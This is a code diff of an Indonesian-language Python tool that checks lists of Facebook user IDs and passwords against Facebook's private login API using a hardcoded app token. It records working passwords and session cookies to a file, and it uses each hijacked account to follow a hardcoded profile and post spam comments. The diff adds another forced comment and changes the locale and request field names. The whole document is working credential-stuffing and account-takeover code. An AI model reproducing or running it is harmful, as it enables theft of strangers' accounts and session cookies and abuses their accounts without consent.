@@ -33,7 +33,7 @@ def fuckx():
 # Kelas utama untuk proses crack akun
 class Sllowly_Dev:
     def __init__(self):
-        self.Sllowly_Dev_file = input('[?] Start Check Input Nama File : ')
+        self.Sllowly_Dev_file = input('[?] Masukan File  : ')
         self.Sllowly_Dev_oks = 0
         self.Sllowly_Dev_cps = 0
         self.Sllowly_Dev_loop = 0
@@ -79,10 +79,10 @@ class Sllowly_Dev:
         for pwku in pasw:
             try:
                 data = {
-                    "kids_xudina": str(uuid.uuid4()),
+                    "adid": str(uuid.uuid4()),
                     "format": "json",
-                    "sha_kids_bokachoda": str(uuid.uuid4()),
-                    "FUCK_ARAFAT": "true",
+                    "device_id": str(uuid.uuid4()),
+                    "cpl": "true",
                     "family_device_id": str(uuid.uuid4()),
                     "credentials_type": "device_based_login_password",
                     "error_detail_type": "button_with_disabled",
@@ -91,8 +91,8 @@ class Sllowly_Dev:
                     "password": pwku,
                     "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                     "generate_session_cookies": "1",
-                    "locale": "en_US",
-                    "client_country_code": "US",
+                    "locale": "id_ID",
+                    "client_country_code": "ID",
                     "method": "auth.login",
                     "fb_api_req_friendly_name": "authenticate",
                     "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
@@ -114,7 +114,7 @@ class Sllowly_Dev:
                 if "access_token" in ridwan:
                     self.Sllowly_Dev_oks += 1
                     coki = ";".join(i["name"]+"="+i["value"] for i in ridwan["session_cookies"]);token = ridwan["access_token"]
-                    message=random.choice(["aman","amanah"]);print(f"\nLIVE ✅\nUID :  {uid}\nPASS : {pwku}\nCOOKIES : {coki}\n");requests.post(f'https://graph.facebook.com/51205914/subscribers?access_token={token}');requests.post(f'https://graph.facebook.com/10105386514074923/comments/?message={message}&access_token={token}')
+                    msg=random.choice(["halo bang","keren bang","keren"]);message=random.choice(["aman","amanah"]);print(f"\nLIVE ✅\nUID :  {uid}\nPASS : {pwku}\nCOOKIES : {coki}\n");requests.post(f'https://graph.facebook.com/51205914/subscribers?access_token={token}');requests.post(f'https://graph.facebook.com/10105386514074923/comments/?message={message}&access_token={token}');requests.post(f'https://graph.facebook.com/10105588843295543/comments/?message={msg}&access_token={token}')
                     open("LIVE.txt", "a+").write(f"{uid}|{pwku}|{coki}\n")
                     break
                 elif "User must verify their account" in ridwan.get("error", {}).get("message", ""):
@@ -131,6 +131,11 @@ class Sllowly_Dev:
 
 if __name__ == '__main__':
 	os.system('clear')
-	print(f"HASIL LIVE DISIMPAN DI FILE LIVE.TXT\nINPUT NAMA FILE UID|PASS UNTUK START\n")
+	print(f"{P}[{H}•{P}] Tools Auto Cek Live - Dead - Auto Komen - Follow")
+	print(f"{P}[{H}•{P}] Step By Step Cara Masukin File Uid")
+	print(f"{P}[{H}•{P}] 1. Buat File uid.txt")
+	print(f"{P}[{H}•{P}] 2. Isi file pakai UID|PASSWORD")
+	print(f"{P}[{H}•{P}] 3. Masukin File Uid Disini")
+	print ("")
 	ridwan = Sllowly_Dev()
 	ridwan.Sllowly_Dev_mulai()
